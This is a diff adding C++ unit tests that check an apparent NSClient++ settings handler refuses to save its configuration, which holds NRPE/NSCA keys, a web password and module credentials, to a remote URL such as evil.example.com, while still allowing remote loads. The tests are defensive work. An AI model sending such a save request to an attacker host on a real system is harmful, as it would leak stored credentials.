@@ -421,6 +421,43 @@ TEST_F(SettingsQueryTest, save_writes_the_pending_changes_to_disk) {
   EXPECT_NE(settings_test::read_file(ini_).find("value"), std::string::npos);
 }
 
+// A SAVE names where the store is written, and nsclient.ini holds the NRPE and
+// NSCA keys, the WEB password and every module's credentials. A remote target
+// would publish, unredacted, what GET /api/v2/settings masks - to a host the
+// caller picked. The request is behind settings.put, which can already rewrite
+// the configuration, but not read the secrets back out of it.
+TEST_F(SettingsQueryTest, save_refuses_a_remote_context) {
+  for (const char *context : {"http://evil.example.com/nsclient.ini", "https://evil.example.com/nsclient.ini"}) {
+    PB::Settings::SettingsRequestMessage request;
+    auto *control = new_request(request)->mutable_control();
+    control->set_command(PB::Settings::Command::SAVE);
+    control->set_context(context);
+
+    const PB::Settings::SettingsResponseMessage response = run(request);
+
+    EXPECT_EQ(response.payload(0).result().code(), PB::Common::Result_StatusCodeType_STATUS_ERROR) << context;
+    EXPECT_NE(response.payload(0).result().message().find("Refusing to save settings to a remote store"), std::string::npos)
+        << response.payload(0).result().message();
+  }
+}
+
+// ...and a LOAD is not refused for the same context. Importing a configuration
+// is what the MSI's ImportConfig action and `nscp settings --migrate-from <url>`
+// do, and refusing it here would take that away without removing a capability:
+// settings.put can already write [/modules] and [/settings/external scripts] and
+// reload. There is no server on the other end in this test, so the request fails
+// - it just must not fail as a refusal.
+TEST_F(SettingsQueryTest, load_does_not_refuse_a_remote_context) {
+  PB::Settings::SettingsRequestMessage request;
+  auto *control = new_request(request)->mutable_control();
+  control->set_command(PB::Settings::Command::LOAD);
+  control->set_context("https://config.example.com/nsclient.ini");
+
+  const PB::Settings::SettingsResponseMessage response = run(request);
+
+  EXPECT_EQ(response.payload(0).result().message().find("Refusing"), std::string::npos) << response.payload(0).result().message();
+}
+
 TEST_F(SettingsQueryTest, a_control_command_that_is_neither_load_nor_save_says_so) {
   // RELOAD is in the protocol but the handler only implements LOAD and SAVE.
   PB::Settings::SettingsRequestMessage request;
